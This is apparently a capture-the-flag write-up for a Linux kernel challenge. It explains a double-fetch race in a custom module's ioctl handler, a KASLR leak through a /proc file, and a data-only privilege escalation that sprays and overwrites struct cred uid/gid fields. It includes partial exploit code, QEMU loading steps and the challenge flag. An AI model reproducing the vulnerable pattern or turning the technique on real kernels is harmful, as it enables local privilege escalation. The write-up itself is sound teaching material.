# Challenge 05: Security Vault Driver - Writeup

## Intro
The "Vault Driver" challenge was the final pwn task of the series, categorized as **Hard**. It takes us into the Linux kernel, specifically targeting a custom character device with a classic yet powerful flaw. Unlike userspace challenges, the kernel environment requires a deeper understanding of memory layout and identity management.

## Environment
The challenge runs on a modern Linux kernel with full protections enabled:
```bash
/ $ cat /proc/version
Linux version 6.18.9 (gcc (GCC) 13.2.0) #1 SMP PREEMPT_DYNAMIC
/ $ lsmod
vault_sec 16384 0 - Live 0xffffffffc0000000 (O)
```

**Protections:**
- **SMEP** (Supervisor Mode Execution Prevention): Enabled
- **SMAP** (Supervisor Mode Access Prevention): Enabled
- **KASLR** (Kernel Address Space Layout Randomization): Enabled
- **KPTI** (Kernel Page Table Isolation): Enabled

## Module Analysis
The `vault_sec` module provides a secure "staging" area for sensitive data. It uses a `seqlock` to purportedly protect global state and allows users to submit data through an IOCTL interface.

```c
struct vault_request {
    uint32_t door_id;
    uint32_t data_len;
};

#define VAULT_IOC_MAGIC  'V'
#define VAULT_IOC_ACCESS _IOWR(VAULT_IOC_MAGIC, 1, struct vault_request)
```

## Vulnerability: Double-Fetch
The vulnerability is a classic **Double-Fetch** (TOCTOU) race condition in the `vault_ioctl` handler.

```c
static long vault_ioctl(struct file *f, unsigned int cmd, unsigned long arg) {
    ...
    // [A] FIRST FETCH: Validate data_len
    unsigned int seq = read_seqbegin(&vault_seqlock);
    if (get_user(validated_len, &ureq->data_len))
        return -EFAULT;
    
    // [B] CHECK: Ensure length is within bounds (256 bytes)
    if (validated_len > sizeof(g_vault_staging))
        return -EINVAL;

    // [C] RACE WINDOW: Deliberate sleep creates a massive window (100ms)
    usleep_range(80000, 120000);

    // [D] SECOND FETCH: Re-reads the structure from user space
    struct vault_request req;
    if (copy_from_user(&req, ureq, sizeof(req)))
        return -EFAULT;

    // [E] OVERFLOW: Uses req.data_len which may have changed!
    if (copy_from_user(g_vault_staging, (uint8_t __user *)arg + sizeof(req), req.data_len))
        return -EFAULT;
    ...
}
```

Wait! At **[A]**, the length is validated. But at **[C]**, the kernel sleeps, allowing a malicious thread to flip the length in userspace. When the kernel wakes up and performs the second fetch at **[D]**, it uses the new (huge) length to overflow the static BSS buffer `g_vault_staging` at **[E]**.

## Information Leak
Bypassing KASLR is trivial here because the module provides a diagnostic `/proc/vault_status` interface. Since `kptr_restrict` is disabled, we can leak the absolute addresses of the module and the staging buffer.

```bash
/ $ cat /proc/vault_status
Vault Security Module v1.0
Module base:    0xffffffffc0000000
Staging addr:   0xffffffffc00021a0
Status: LOCKED
```

## Exploitation: Data-Only Attack
Since **SMEP/SMAP/KPTI** are all active, hijacking the control flow (RIP) to run a ROP chain is cumbersome. Instead, we perform a **Data-Only** attack by targeting the **`struct cred`** of a process.

### 1. Cred Spray
We fork 512 child processes. In Linux, each process has a credential structure (`struct cred`) in the kernel heap. These structures contain the UID and GID. In this kernel, they are allocated in the `kmalloc-192` bin.

### 2. Winning the Race
We use a thread to flip the `data_len` from `64` to `0x4000` while the `ioctl` is in the `usleep` window. 

### 3. Overwriting Identity
The overflow "bleeds" from the module's BSS into the heap, saturating the memory with our payload. We target the `uid`/`gid` offsets (at +4) and set them to `0` (root).

```c
// Payload pattern for kmalloc-192 (192 bytes)
for (size_t off = 0; off < 0x4000; off += 192) {
    *(uint32_t *)(payload + off + 0x00) = 1; // Usage count
    *(uint32_t *)(payload + off + 0x04) = 0; // UID (root)
    *(uint32_t *)(payload + off + 0x08) = 0; // GID (root)
}
```

## Exploit Code (Summary)
The exploit implements the multithreaded race and the cred spray. It then monitors `/proc/[pid]/status` to find the child that successfully became root.

```c
// [Selected logic from exploit.c]
void *flip_thread(void *arg) {
    while (!g_race_won) {
        g_ureq.data_len = 0x4000; // Large size
        usleep(100);
        g_ureq.data_len = 64;     // Reset
    }
}
```

## Outro
This challenge was a great lesson in why **Double Fetches** are so dangerous and why **Data-Only** attacks are the most robust way to bypass modern kernel mitigations. 

---

## Appendix: Loading the Exploit onto the Target

### Method A: Base64 Transfer (Fastest)
1. **On Host**: `base64 -w0 exploit_static > exploit.b64`
2. **In QEMU**:
```bash
~ # cat <<EOF > exploit.b64
[PASTE_BASE64_STRING_HERE]
EOF
~ # base64 -d exploit.b64 > /tmp/exploit
~ # chmod +x /tmp/exploit
~ # /tmp/exploit
```

### Method B: Manual RootFS Repack (Stable)
1. **Unpack**: `mkdir tmp; cd tmp; zcat ../rootfs.cpio.gz | cpio -idmv`
2. **Add**: `cp ../exploit_static ./exploit && chmod +x exploit`
3. **Repack**: `find . | cpio -o -H newc | gzip > ../rootfs.cpio.gz`
4. **Run**: Boot with `./run.sh` and execute `./exploit`.

## Flag
`nmctf{K3RN3L_R4C3_CR3D_0V3RW173}`